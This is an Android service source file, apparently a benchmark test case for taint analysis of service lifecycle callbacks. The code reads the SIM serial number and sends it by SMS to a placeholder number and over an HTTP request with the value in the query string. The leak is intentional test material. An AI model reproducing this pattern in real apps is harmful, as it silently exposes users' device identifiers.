package de.ecspride;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name ServiceLifecycle1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description A source is called and stored to a variable in one callback method,
 *  the variable is passed to a sink in another callback method
 * @dataflow onStartCommand: source -> secret; onLowMemory: secret -> sink
 * @number_of_leaks 1
 * @challenges the analysis must be able to handle the service lifecycle correctly 
 */
public class MainService extends Service {
	private String secret = null;
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		secret = telephonyManager.getSimSerialNumber(); //source
		return 0;
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO for communication return IBinder implementation
		return null;
	}
	
	@Override
	public void onLowMemory(){
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, secret, null, null);   //sink, leak

		try {
			connect(secret);
		} catch (Exception e) {
			e.printStackTrace();
		}
  	}

	private void connect(String data) throws IOException {
		String URL = "http://www.google.de/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();
		Log.d(getClass().getSimpleName(), URL);

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
		Log.d(getClass().getSimpleName(), sb.toString());
	}

}